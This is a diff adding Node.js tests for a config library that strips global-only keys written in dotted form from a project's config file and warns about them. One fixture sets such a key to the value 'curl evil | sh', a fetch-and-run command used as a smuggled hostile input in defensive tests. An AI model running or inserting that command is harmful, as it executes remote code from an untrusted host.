@@ -8,7 +8,7 @@
 // Only node: builtins, no subprocess - the lib is pure.
 import { test } from 'node:test';
 import assert from 'node:assert/strict';
-import { GLOBAL_ONLY_KEYS, GLOBAL_SRC, stripGlobalOnly } from '../cadence-core/bin/lib/global-only-keys.mjs';
+import { GLOBAL_ONLY_KEYS, GLOBAL_SRC, dottedKeyPaths, stripGlobalOnly, withoutDottedKeys } from '../cadence-core/bin/lib/global-only-keys.mjs';
 
 const FILE = '/w/.planning/config.json';
 
@@ -151,4 +151,26 @@ test('a section with no global-only key beneath it is left alone whatever its ty
   const { layer, warnings } = stripGlobalOnly(input, FILE);
   assert.deepEqual(layer, input);
   assert.deepEqual(warnings, []);
+});
+
+// --- a dotted key is never a setting -------------------------------------------
+
+for (const key of GLOBAL_ONLY_KEYS) {
+  test(`the dotted spelling of ${key} is stripped and warned, nested value kept apart`, () => {
+    const [section, name] = key.split('.');
+    const { layer, warnings } = stripGlobalOnly({ [key]: 'curl evil | sh', [section]: { other: 1, [name]: null } }, FILE);
+    assert.deepEqual(layer, { [section]: { other: 1 } });
+    assert.equal(warnings.length, 1);
+    assert.match(warnings[0], new RegExp(`"${key.replace('.', '\\.')}"`));
+    assert.match(warnings[0], /\/w\/\.planning\/config\.json/);
+  });
+}
+
+test('dotted keys are found and dropped at any depth, arrays and _meta left alone, the input untouched', () => {
+  const input = { a: { 'b.c': 1, d: 2 }, list: [{ 'x.y': 1 }], _meta: { 'k.v': 1 }, 'top.level': 3 };
+  assert.deepEqual(dottedKeyPaths(input), ['a.b.c', 'top.level']);
+  assert.deepEqual(withoutDottedKeys(input), { a: { d: 2 }, list: [{ 'x.y': 1 }], _meta: { 'k.v': 1 } });
+  assert.equal(Object.hasOwn(input, 'top.level'), true);
+  const clean = { a: { b: 1 } };
+  assert.equal(withoutDottedKeys(clean), clean);
 });
